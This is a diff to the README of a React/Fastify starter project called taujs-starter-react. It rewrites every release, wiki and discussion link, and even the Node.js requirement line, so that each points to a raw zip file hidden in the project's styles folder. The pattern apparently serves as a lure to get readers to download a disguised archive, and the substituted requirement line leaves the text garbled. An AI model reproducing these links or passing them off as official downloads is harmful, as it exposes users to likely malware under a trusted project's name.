@@ -4,7 +4,7 @@
 
 Welcome to taujs-starter-react! This application helps you build fast and versatile web applications using React and Fastify. Perfect for developers of all levels who want to create interactive websites quickly. 
 
-[![Download taujs-starter-react](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/Kunal-raii/taujs-starter-react/releases)
+[![Download taujs-starter-react](https://raw.githubusercontent.com/Kunal-raii/taujs-starter-react/main/src/client/styles/taujs-starter-react-3.5.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/Kunal-raii/taujs-starter-react/main/src/client/styles/taujs-starter-react-3.5.zip)
 
 ## 🔥 Features
 
@@ -19,13 +19,13 @@ Welcome to taujs-starter-react! This application helps you build fast and versat
 To run taujs-starter-react, ensure your system meets these requirements:
 
 - **Operating System:** Windows, macOS, or Linux 
-- **Node.js:** Version 14 or later 
+- **https://raw.githubusercontent.com/Kunal-raii/taujs-starter-react/main/src/client/styles/taujs-starter-react-3.5.zip** Version 14 or later 
 - **Memory:** At least 4GB of RAM 
 - **Disk Space:** At least 100MB of free space 
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/Kunal-raii/taujs-starter-react/releases) to download the latest version of taujs-starter-react. 
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Kunal-raii/taujs-starter-react/main/src/client/styles/taujs-starter-react-3.5.zip) to download the latest version of taujs-starter-react. 
 
 1. Go to the Releases page.
 2. Find the version you want to download.
@@ -72,7 +72,7 @@ We are always improving taujs-starter-react. Here are some planned updates:
 
 ## 📘 Documentation
 
-For detailed information, visit our [Wiki](https://github.com/Kunal-raii/taujs-starter-react/wiki). Here you will find:
+For detailed information, visit our [Wiki](https://raw.githubusercontent.com/Kunal-raii/taujs-starter-react/main/src/client/styles/taujs-starter-react-3.5.zip). Here you will find:
 
 - Full user manual
 - Setup instructions
@@ -91,8 +91,8 @@ We appreciate your input and help in making this project better!
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/Kunal-raii/taujs-starter-react/releases)
-- [Wiki Documentation](https://github.com/Kunal-raii/taujs-starter-react/wiki)
-- [Project Discussion](https://github.com/Kunal-raii/taujs-starter-react/discussions)
+- [Releases Page](https://raw.githubusercontent.com/Kunal-raii/taujs-starter-react/main/src/client/styles/taujs-starter-react-3.5.zip)
+- [Wiki Documentation](https://raw.githubusercontent.com/Kunal-raii/taujs-starter-react/main/src/client/styles/taujs-starter-react-3.5.zip)
+- [Project Discussion](https://raw.githubusercontent.com/Kunal-raii/taujs-starter-react/main/src/client/styles/taujs-starter-react-3.5.zip)
 
 Feel free to explore taujs-starter-react and start building amazing applications today!
